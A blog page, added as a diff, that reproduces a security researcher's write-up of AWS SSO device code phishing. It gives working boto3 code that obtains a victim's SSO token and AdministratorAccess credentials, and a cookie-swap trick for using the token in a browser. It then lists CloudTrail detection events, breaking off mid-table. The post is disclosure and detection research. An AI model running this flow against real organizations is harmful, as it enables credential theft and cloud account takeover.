@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pocket.qiwihui.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Phishing for AWS credentials via AWS SSO device code authentication">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phishing for AWS credentials via AWS SSO device code authentication">
+<meta property="og:url" content="http://pocket.qiwihui.com/2021/06/11/qiwihui-pocket_readings-1129/index.html">
+<meta property="og:site_name" content="Pocket Readings">
+<meta property="og:description" content="Phishing for AWS credentials via AWS SSO device code authentication">
+<meta property="og:image" content="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-1024x382.png">
+<meta property="og:image" content="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-1-1024x348.png">
+<meta property="og:image" content="https://blog.christophetd.fr/wp-content/uploads/2021/06/Your-applications-2021-06-01-08-03-37-1-1024x603.png">
+<meta property="og:image" content="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-2.png">
+<meta property="og:image" content="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-2.png">
+<meta property="og:image" content="https://blog.christophetd.fr/wp-content/uploads/2021/06/Your-applications-2021-06-01-08-03-37-2-1024x603.png">
+<meta property="og:image" content="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-5-1024x211.png">
+<meta property="article:published_time" content="2021-06-11T03:21:55.000Z">
+<meta property="article:modified_time" content="2021-07-21T13:58:31.406Z">
+<meta property="article:author" content="qiwihui">
+<meta property="article:tag" content="fetched">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-1024x382.png">
+
+<link rel="canonical" href="http://pocket.qiwihui.com/2021/06/11/qiwihui-pocket_readings-1129/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Phishing for AWS credentials via AWS SSO device code authentication | Pocket Readings</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pocket Readings</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">个人阅读清单记录博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://pocket.qiwihui.com/2021/06/11/qiwihui-pocket_readings-1129/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qiwihui">
+      <meta itemprop="description" content="个人阅读清单记录博客，并不代表个人观点。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pocket Readings">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Phishing for AWS credentials via AWS SSO device code authentication
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-06-11 03:21:55" itemprop="dateCreated datePublished" datetime="2021-06-11T03:21:55+00:00">2021-06-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-07-21 13:58:31" itemprop="dateModified" datetime="2021-07-21T13:58:31+00:00">2021-07-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/2019%E9%98%85%E8%AF%BB/" itemprop="url" rel="index"><span itemprop="name">2019阅读</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">Phishing for AWS credentials via AWS SSO device code authentication</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>When using AWS in an enterprise environment, best practices dictate to use a single sign-on service for identity and access management. AWS SSO is a popular solution, integrating with third-party providers such as Okta and allowing to centrally manage roles and permissions in multiple AWS accounts.<br><br><br><br>Tags: security<br><br><br><br>via Pocket <a href="https://ift.tt/3g6f51c" target="_blank" rel="noopener">https://ift.tt/3g6f51c</a> original site<br><br><br><br>June 11, 2021 at 11:20AM</p>
+<h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><hr>
+<blockquote>
+<p>from: <a href="https://github.com/qiwihui/pocket_readings/issues/1129#issuecomment-859233533" target="_blank" rel="noopener"><strong>github-actions[bot]</strong></a> on: <strong>6/11/2021</strong></p>
+</blockquote>
+<h2 id="Phishing-for-AWS-credentials-via-AWS-SSO-device-code-authentication-by-christophetd"><a href="#Phishing-for-AWS-credentials-via-AWS-SSO-device-code-authentication-by-christophetd" class="headerlink" title="Phishing for AWS credentials via AWS SSO device code authentication by @christophetd"></a>Phishing for AWS credentials via AWS SSO device code authentication by @christophetd</h2><p>When using AWS in an enterprise environment, best practices dictate to use a single sign-on service for identity and access management. AWS SSO is a popular solution, integrating with third-party providers such as Okta and allowing to centrally manage roles and permissions in multiple AWS accounts.</p>
+<p>In this post, we demonstrate that AWS SSO is vulnerable by design to <em>device code authentication phishing</em> – just like any identity provider implementing OpenID Connect device code authentication. This technique was first <a href="https://o365blog.com/post/phishing/" target="_blank" rel="noopener">demonstrated</a> by Dr. Nestori Syynimaa for Azure AD. The feature provides a powerful phishing vector for attackers, rendering ineffective controls such as MFA (including Yubikeys) or IP allow-listing at the IdP level.</p>
+<p>Table of Contents</p>
+<ul>
+<li><a href="https://blog.christophetd.fr/#Background" target="_blank" rel="noopener">1 Background</a><ul>
+<li><a href="https://blog.christophetd.fr/#AWS_SSO" target="_blank" rel="noopener">1.1 AWS SSO</a></li>
+<li><a href="https://blog.christophetd.fr/#Using_AWS_SSO_from_the_CLI" target="_blank" rel="noopener">1.2 Using AWS SSO from the CLI</a></li>
+<li><a href="https://blog.christophetd.fr/#The_device_code_grant_type" target="_blank" rel="noopener">1.3 The device code grant type</a></li>
+</ul>
+</li>
+<li><a href="https://blog.christophetd.fr/#Phishing_with_AWS_SSO_device_codes" target="_blank" rel="noopener">2 Phishing with AWS SSO device codes</a><ul>
+<li><a href="https://blog.christophetd.fr/#Step_0_Prerequisites" target="_blank" rel="noopener">2.1 Step 0: Prerequisites</a></li>
+<li><a href="https://blog.christophetd.fr/#Step_1_Attacker_initiates_a_device_code_authorization_flow" target="_blank" rel="noopener">2.2 Step 1: Attacker initiates a device code authorization flow</a></li>
+<li><a href="https://blog.christophetd.fr/#Step_2_Attacker_sends_the_device_authorization_URL_to_the_victim" target="_blank" rel="noopener">2.3 Step 2: Attacker sends the device authorization URL to the victim</a></li>
+<li><a href="https://blog.christophetd.fr/#Step_3_Attacker_retrieves_an_SSO_access_token" target="_blank" rel="noopener">2.4 Step 3: Attacker retrieves an SSO access token</a></li>
+<li><a href="https://blog.christophetd.fr/#Step_4_Attacker_uses_the_SSO_access_token_to_access_AWS_accounts" target="_blank" rel="noopener">2.5 Step 4: Attacker uses the SSO access token to access AWS accounts</a></li>
+<li><a href="https://blog.christophetd.fr/#What8217s_a_blog_post_without_a_tool" target="_blank" rel="noopener">2.6 What’s a blog post without a tool?</a></li>
+</ul>
+</li>
+<li><a href="https://blog.christophetd.fr/#Detection_prevention" target="_blank" rel="noopener">3 Detection &amp; prevention</a><ul>
+<li><a href="https://blog.christophetd.fr/#Prevention" target="_blank" rel="noopener">3.1 Prevention</a></li>
+<li><a href="https://blog.christophetd.fr/#CloudTrail_events_at_each_step_of_the_attack" target="_blank" rel="noopener">3.2 CloudTrail events at each step of the attack</a></li>
+<li><a href="https://blog.christophetd.fr/#Detection_strategies" target="_blank" rel="noopener">3.3 Detection strategies</a></li>
+<li><a href="https://blog.christophetd.fr/#Containment_8211_revoking_AWS_SSO_access_tokens" target="_blank" rel="noopener">3.4 Containment – revoking AWS SSO access tokens</a></li>
+</ul>
+</li>
+<li><a href="https://blog.christophetd.fr/#Conclusion" target="_blank" rel="noopener">4 Conclusion</a></li>
+</ul>
+<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="AWS-SSO"><a href="#AWS-SSO" class="headerlink" title="AWS SSO"></a>AWS SSO</h3><p>AWS SSO is a service offered by AWS to manage roles and identities for multiple AWS accounts. Quoting the <a href="https://aws.amazon.com/single-sign-on/" target="_blank" rel="noopener">documentation</a>:</p>
+<blockquote>
+<p>With AWS SSO, you can easily manage access and user permissions to all of your accounts in AWS Organizations centrally. AWS SSO configures and maintains all the necessary permissions for your accounts automatically, without requiring any additional setup in the individual accounts. You can assign user permissions based on common job functions and customize these permissions to meet your specific security requirements.</p>
+</blockquote>
+<p>Identities in AWS SSO come from the AWS SSO identity store itself. There are 3 ways your users and groups can end up in this identity store:</p>
+<ul>
+<li>Manually added to the AWS SSO identity store itself. In which case, they are created directly in AWS SSO, who acts as the IdP. (Credentials and password reset flows are then handled by AWS SSO as well.)</li>
+<li>From <a href="https://docs.aws.amazon.com/singlesignon/latest/userguide/manage-your-identity-source-ad.html" target="_blank" rel="noopener">Active Directory</a>, and synced automatically to the AWS SSO identity store (one-way sync).</li>
+<li>From any <a href="https://docs.aws.amazon.com/singlesignon/latest/userguide/manage-your-identity-source-idp.html" target="_blank" rel="noopener">third-party identity provider</a> such as Okta supporting SAML. If the identity provider supports SCIM, users and groups can be automatically synced to the AWS SSO identity store as well (one-way sync).</li>
+</ul>
+<p>Once your identity provider is set up, you can start assigning <em>permission sets</em> to users and groups inside your various accounts.</p>
+<ul>
+<li><a href="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-1024x382.png" target="_blank" rel="noopener"><img src="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-1024x382.png" alt=""></a>Enabling AWS SSO</li>
+<li><a href="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-1-1024x348.png" target="_blank" rel="noopener"><img src="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-1-1024x348.png" alt=""></a>AWS SSO identity settings</li>
+<li><a href="https://blog.christophetd.fr/wp-content/uploads/2021/06/Your-applications-2021-06-01-08-03-37-1.png" target="_blank" rel="noopener"><img src="https://blog.christophetd.fr/wp-content/uploads/2021/06/Your-applications-2021-06-01-08-03-37-1-1024x603.png" alt=""></a>End-user view after authenticating using AWS SSO</li>
+</ul>
+<h3 id="Using-AWS-SSO-from-the-CLI"><a href="#Using-AWS-SSO-from-the-CLI" class="headerlink" title="Using AWS SSO from the CLI"></a>Using AWS SSO from the CLI</h3><p>The first thing an engineer will ask when confronted to AWS is: <em>how can I use it from the CLI?</em> As the security folks, our focus is generally on avoiding IAM users whose credentials are long-lived and a nightmare to manage securely.</p>
+<p>This is why AWS SSO implements part of the OAuth 2.0 specification – just enough to be able to use it from the CLI:</p>
+<blockquote>
+<p>The AWS SSO OpenID Connect (OIDC) service currently implements only the <strong>portions of the OAuth 2.0 Device Authorization Grant standard (<a href="https://tools.ietf.org/html/rfc8628" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc8628</a>) that are necessary to enable SSO authentication with the AWS CLI</strong>. Support for other OIDC flows frequently needed for native applications, such as Authorization Code Flow (+ PKCE), will be addressed in future releases.</p>
+<p><a href="https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/Welcome.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/Welcome.html</a></p>
+</blockquote>
+<p>Using AWS SSO from the command line is <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-sso.html" target="_blank" rel="noopener">natively supported</a> in tools such as the AWS CLI or <a href="https://github.com/99designs/aws-vault" target="_blank" rel="noopener">aws-vault</a>:</p>
+<p>$ aws configure sso<br>SSO start URL [None]: [None]: <a href="https://my-sso-portal.awsapps.com/start" target="_blank" rel="noopener">https://my-sso-portal.awsapps.com/start</a><br>SSO region [None]:us-east-1</p>
+<p>Using a browser, open the following URL:</p>
+<p><a href="https://device.sso.eu-central-1.amazonaws.com/" target="_blank" rel="noopener">https://device.sso.eu-central-1.amazonaws.com/</a></p>
+<p>and enter the following code:<br>QCFK-N451</p>
+<p>After this initial authentication flow, you are shown the list of AWS accounts you have access to and the roles available to you.</p>
+<h3 id="The-device-code-grant-type"><a href="#The-device-code-grant-type" class="headerlink" title="The device code grant type"></a>The <em>device code</em> grant type</h3><p>Under the hood, the following is happening:</p>
+<ol>
+<li><p>The client application (AWS CLI) registers an OIDC client by calling <a href="https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/API_RegisterClient.html" target="_blank" rel="noopener">sso-oidc:RegisterClient</a>. It does not need authentication to do it.  </p>
+</li>
+<li><p>The client application calls <a href="https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/API_StartDeviceAuthorization.html" target="_blank" rel="noopener">sso-oidc:StartDeviceAuthorization</a>. This generates an URL that looks like <em><a href="https://device.sso.eu-central-1.amazonaws.com/?user\_code=SPNB-NVKN" target="_blank" rel="noopener">https://device.sso.eu-central-1.amazonaws.com/?user\_code=SPNB-NVKN</a></em>  </p>
+</li>
+<li><p>The end user opens the link and is redirected to authenticate on their identity provider. If using AWS on a daily basis, it is likely they are already logged in and transparently redirected to the next step.  </p>
+</li>
+<li><p>The end user opens this URL and sees the following prompt:</p>
+</li>
+</ol>
+<p><a href="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-2.png" target="_blank" rel="noopener"><img src="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-2.png" alt=""></a></p>
+<ol>
+<li>Once the end user has accepted the prompt, the client applications calls <a href="https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/API_CreateToken.html" target="_blank" rel="noopener">sso-oidc:CreateToken</a> to retrieve an <strong>AWS SSO access token</strong>.</li>
+</ol>
+<p>With this access token, the client application can use the AWS SSO API, and in particular:</p>
+<ul>
+<li>List all the AWS accounts to which the end user has access (<a href="https://docs.aws.amazon.com/singlesignon/latest/PortalAPIReference/API_ListAccounts.html" target="_blank" rel="noopener">sso:ListAccounts</a>)</li>
+<li>List all the roles available to the end user in every AWS account (<a href="https://docs.aws.amazon.com/singlesignon/latest/PortalAPIReference/API_ListAccountRoles.html" target="_blank" rel="noopener">sso:ListAccountRoles</a>)</li>
+<li>Assume any of these roles to retrieve temporary STS credentials (<a href="https://docs.aws.amazon.com/singlesignon/latest/PortalAPIReference/API_GetRoleCredentials.html" target="_blank" rel="noopener">sso:GetRoleCredentials</a>)</li>
+</ul>
+<h2 id="Phishing-with-AWS-SSO-device-codes"><a href="#Phishing-with-AWS-SSO-device-codes" class="headerlink" title="Phishing with AWS SSO device codes"></a>Phishing with AWS SSO device codes</h2><p>You might have figured; this is a great phishing vector. On top of using a legitimate AWS website, it renders ineffective all the enterprise-grade security mechanisms such as multi-factor authentication, device trust, etc.</p>
+<p>Let’s unroll the scenario.</p>
+<h3 id="Step-0-Prerequisites"><a href="#Step-0-Prerequisites" class="headerlink" title="Step 0: Prerequisites"></a>Step 0: Prerequisites</h3><p>The attacker needs to know ahead of time the AWS SSO URL of the victim organization, which looks like _<something>.awsapps.com_. This can be found via social engineering, guessing, subdomain discovery, etc.</p>
+<p>This isn’t hard for an attacker. Many organizations just use their name. Running <a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">sublist3r</a> on <em>awsapps.com</em> already yields hundreds of results.</p>
+<p>With the victim-specific AWS SSO URL in mind, the attacker can trivially determine in which region AWS SSO is configured (needed for next steps):</p>
+<p>$ curl <a href="https://victim.awsapps.com/start/" target="_blank" rel="noopener">https://victim.awsapps.com/start/</a> -s | grep ‘meta name=”region”‘<br>    <meta name="region" content="us-east-1"/></p>
+<h3 id="Step-1-Attacker-initiates-a-device-code-authorization-flow"><a href="#Step-1-Attacker-initiates-a-device-code-authorization-flow" class="headerlink" title="Step 1: Attacker initiates a device code authorization flow"></a>Step 1: Attacker initiates a device code authorization flow</h3><p>Here’s what it looks like with Python:</p>
+<p>REGION = ‘us-east-1’<br>AWS_SSO_START_URL = ‘<a href="https://xxx.awsapps.com/start&#39;" target="_blank" rel="noopener">https://xxx.awsapps.com/start&#39;</a></p>
+<p>sso_oidc = boto3.client(‘sso-oidc’, region_name=REGION)<br>client = sso_oidc.register_client(<br>    clientName = ‘my-attacker’,<br>    clientType = ‘public’<br>)<br>client_id = client.get(‘clientId’)<br>client_secret = client.get(‘clientSecret’)</p>
+<p>authz = sso_oidc.start_device_authorization(<br>    clientId=client_id,<br>    clientSecret=client_secret,<br>    startUrl=AWS_SSO_START_URL<br>)</p>
+<p>url = authz.get(‘verificationUriComplete’)<br>deviceCode = authz.get(‘deviceCode’)<br>print(“Give this URL to the victim: “ + url)</p>
+<h3 id="Step-2-Attacker-sends-the-device-authorization-URL-to-the-victim"><a href="#Step-2-Attacker-sends-the-device-authorization-URL-to-the-victim" class="headerlink" title="Step 2: Attacker sends the device authorization URL to the victim"></a>Step 2: Attacker sends the device authorization URL to the victim</h3><p>For instance, via phishing. The victim is authenticated by their usual identity provider (e.g. Okta). After passing all the identity provider-specific checks (MFA, device trust…), they only need to accept the following prompt:</p>
+<p><a href="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-2.png" target="_blank" rel="noopener"><img src="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-2.png" alt=""></a></p>
+<h3 id="Step-3-Attacker-retrieves-an-SSO-access-token"><a href="#Step-3-Attacker-retrieves-an-SSO-access-token" class="headerlink" title="Step 3: Attacker retrieves an SSO access token"></a>Step 3: Attacker retrieves an SSO access token</h3><p>Once the victim accepts the prompt, the attacker uses <a href="https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/API_CreateToken.html" target="_blank" rel="noopener">sso-oidc:CreateToken</a> to retrieve a SSO access token:</p>
+<p>token_response = sso_oidc.create_token(<br>    clientId=client_id,<br>    clientSecret=client_secret,<br>    grantType=”urn:ietf:params:oauth:grant-type:device_code”,<br>    deviceCode=deviceCode<br>)<br>sso_token = token_response.get(‘accessToken’)</p>
+<p>The SSO access token retrieved here is <strong>valid for 8 hours</strong>. Plenty of time to perform and repeat the next steps as needed.</p>
+<h3 id="Step-4-Attacker-uses-the-SSO-access-token-to-access-AWS-accounts"><a href="#Step-4-Attacker-uses-the-SSO-access-token-to-access-AWS-accounts" class="headerlink" title="Step 4: Attacker uses the SSO access token to access AWS accounts"></a>Step 4: Attacker uses the SSO access token to access AWS accounts</h3><p>Armed with the SSO access token of the victim, the attacker enumerates AWS accounts the victim has access to, as well as the roles available to them.</p>
+<p>aws_accounts = sso.list_accounts(accessToken=sso_token)</p>
+<p>[<br>    {<br>        “accountId”: “11xxxxxxxx”,<br>        “accountName”: “Dev account”,<br>        “emailAddress”: “my-dev-account@ example.com”<br>    },<br>    {<br>        “accountId”: “54xxxxxxx”,<br>        “accountName”: “Prod account”,<br>        “emailAddress”: “my-prod-account@ example.com”<br>    }<br>]</p>
+<p>Then, list the AWS SSO roles (“permission sets”) available in a specific account:</p>
+<p>roles_response = sso.list_account_roles(<br>    accessToken=sso_token,<br>    accountId=”11xxxxxxxx”<br>)</p>
+<p>[<br>    {<br>        “roleName”: “AdministratorAccess”,<br>        “accountId”: “11xxxxxxxxxx”<br>    },<br>    {<br>        “roleName”: “ViewOnlyAccess”,<br>        “accountId”: “11xxxxxxxxxx”<br>    }<br>]</p>
+<p>Finally, retrieve STS credentials for a specific permission set in an AWS account:</p>
+<p>sts_creds = sso.get_role_credentials(<br>    accessToken=sso_token,<br>    roleName=’AdministratorAccess’,<br>    accountId=’11…’<br>)</p>
+<p>{<br>    “accessKeyId”: “ASIARW4JVWBODWMM5TMN”,<br>    “secretAccessKey”: “Ocq..m1T”,<br>    “sessionToken”: “IQoJb3..VTNA==”,<br>    “expiration”: 1622567348000<br>}</p>
+<p>$ export AWS_ACCESS_KEY_ID=ASIARW4JVWBODWMM5TMN<br>$ export AWS_SECRET_ACCESS_KEY=Ocq..m1T<br>$ export AWS_SESSION_TOKEN=IQoJb3..VTNA==</p>
+<p>$ aws sts get-caller-identity<br>{<br>    “UserId”: “AROAR…:christophetd”,<br>    “Account”: “11xxxxxxxxxx”,<br>    “Arn”: “arn:aws:sts::11xxxxxxxxxx:assumed-role/AWSReservedSSO_AdministratorAccess_e3db84cb28e132d6/christophetd”<br>}</p>
+<p>Alternatively, for lazy attackers who prefer using a GUI, simply:</p>
+<ol>
+<li>open your own AWS SSO page (e.g. <em>attacker.awsapps.com/start</em>)</li>
+<li>in your browser, replace in the cookie <em>x-amz-sso_authn</em> with the SSO token of the victim</li>
+<li>refresh the page</li>
+</ol>
+<p>.. and you end up with the AWS accounts list of the victim which you can nicely access from a GUI.</p>
+<p><a href="https://blog.christophetd.fr/wp-content/uploads/2021/06/Your-applications-2021-06-01-08-03-37-2.png" target="_blank" rel="noopener"><img src="https://blog.christophetd.fr/wp-content/uploads/2021/06/Your-applications-2021-06-01-08-03-37-2-1024x603.png" alt=""></a></p>
+<h3 id="What’s-a-blog-post-without-a-tool"><a href="#What’s-a-blog-post-without-a-tool" class="headerlink" title="What’s a blog post without a tool?"></a>What’s a blog post without a tool?</h3><p>I published a small Python tool to test the concept:</p>
+<p><a href="https://github.com/christophetd/aws-sso-device-code-authentication" target="_blank" rel="noopener"><strong>https://github.com/christophetd/aws-sso-device-code-authentication</strong></a></p>
+<p><a href="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-5.png" target="_blank" rel="noopener"><img src="https://blog.christophetd.fr/wp-content/uploads/2021/06/image-5-1024x211.png" alt=""></a></p>
+<p>Note that this tool isn’t exactly useful, since you can use <em>aws configure sso</em> to achieve the same purpose. But at least, it’s educational and doesn’t mess with your current AWS CLI configuration!</p>
+<h2 id="Detection-amp-prevention"><a href="#Detection-amp-prevention" class="headerlink" title="Detection &amp; prevention"></a>Detection &amp; prevention</h2><h3 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h3><p><em>It’s a feature, not a bug</em>. If you use AWS SSO, you cannot prevent such phishing attacks. It’s also not possible to use a SCP to restrict the calls to <em>sso-oidc:CreateToken</em> to certain conditions, since this API call is performed against the organization master account (which is not subject to SCPs).</p>
+<h3 id="CloudTrail-events-at-each-step-of-the-attack"><a href="#CloudTrail-events-at-each-step-of-the-attack" class="headerlink" title="CloudTrail events at each step of the attack"></a>CloudTrail events at each step of the attack</h3><p>In terms of detection, the initial calls to <a href="https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/API_RegisterClient.html" target="_blank" rel="noopener">sso-oidc:RegisterClient</a> and <a href="https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/API_StartDeviceAuthorization.html" target="_blank" rel="noopener">sso-oidc:StartDeviceAuthorization</a> are not logged to CloudTrail since they are performed without authentication, and not against a specific AWS account of the organization. But CloudTrail does give us a few information.</p>
+<p>First, <em>sso:ListApplications</em> is logged at the exact time when the victim is shown the “Sign-in to AWS CLI” pop-up.</p>
+<p>{<br>    “eventVersion”: “1.08”,<br>    “userIdentity”: {<br>        “type”: “Unknown”,<br>        “principalId”: “<internal victim user id>“,<br>        “accountId”: “<organization master account ID>“,<br>        “userName”: “<victim display name>“<br>    },<br>    “eventTime”: “…”,<br>    “eventSource”: “sso.amazonaws.com”,<br>    “eventName”: “ListApplications”,<br>    “sourceIPAddress”: “<Victim source IP>“,<br>    “userAgent”: “<Victim browser user agent>“<br>}</p>
+<p>Then, once the victim accepts the prompt and the attacker retrieves the victim’s AWS SSO access token, <a href="https://docs.aws.amazon.com/singlesignon/latest/OIDCAPIReference/API_CreateToken.html" target="_blank" rel="noopener">sso-oidc:CreateToken</a> is generated:</p>
+<p>{<br>    “eventVersion”: “1.08”,<br>    “userIdentity”: {<br>        “type”: “Unknown”,<br>        “principalId”: “<internal victim user id>“,<br>        “accountId”: “<organization master account ID>“,<br>        “userName”: “<victim display name>“<br>    },<br>    “eventSource”: “sso.amazonaws.com”,<br>    “eventName”: “CreateToken”,<br>    “sourceIPAddress”: “<Attacker source IP>“,<br>    “userAgent”: “&lt;Attacker user agent (here: Boto3/1.17.80 Python/3.9.5 Darwin/20.3.0 Botocore/1.20.80)&gt;”,<br>    “requestParameters”: {<br>        “clientId”: “…”,<br>        “clientSecret”: “HIDDEN_DUE_TO_SECURITY_REASONS”,<br>        “grantType”: “urn:ietf:params:oauth:grant-type:device_code”,<br>        “deviceCode”: “…”<br>    },<br>    “responseElements”: {<br>        “accessToken”: “HIDDEN_DUE_TO_SECURITY_REASONS”,<br>        “tokenType”: “Bearer”,<br>        “expiresIn”: 28800,<br>        “refreshToken”: “HIDDEN_DUE_TO_SECURITY_REASONS”,<br>        “idToken”: “HIDDEN_DUE_TO_SECURITY_REASONS”<br>    },<br>    “recipientAccountId”: “<organization master account ID>“<br>}</p>
+<p>Finally, when the attacker enumerates AWS accounts the victim has access to through AWS SSO, <a href="https://docs.aws.amazon.com/singlesignon/latest/PortalAPIReference/API_ListAccounts.html" target="_blank" rel="noopener">sso:ListAccounts</a> and <a href="https://docs.aws.amazon.com/singlesignon/latest/PortalAPIReference/API_ListAccountRoles.html" target="_blank" rel="noopener">sso:ListAccountRoles</a> are logged:</p>
+<p>{<br>    “eventVersion”: “1.08”,<br>    “userIdentity”: {<br>        “type”: “Unknown”,<br>        “principalId”: “<internal victim user id>“,<br>        “accountId”: “<organization master account ID>“,<br>        “userName”: “<Victim e-mail>“<br>    },<br>    “eventSource”: “sso.amazonaws.com”,<br>    “eventName”: “ListAccountRoles”,<br>    “sourceIPAddress”: “<Attacker source IP>“,<br>    “userAgent”: “&lt;Attacker user agent (here: Boto3/1.17.80 Python/3.9.5 Darwin/20.3.0 Botocore/1.20.80)&gt;”,<br>    “recipientAccountId”: “<organization master account ID>“,<br>    “serviceEventDetails”: {<br>        “account_id”: “<enumerated children account ID>“<br>    }<br>}</p>
+<p>To sum up:</p>
+<p><strong>Attack step</strong></p>
+<p><strong>CloudTrail event(s)</strong></p>
+<p><strong>Source IP</strong></p>
+<p>Attacker generates a device code URL</p>
+<p>None</p>
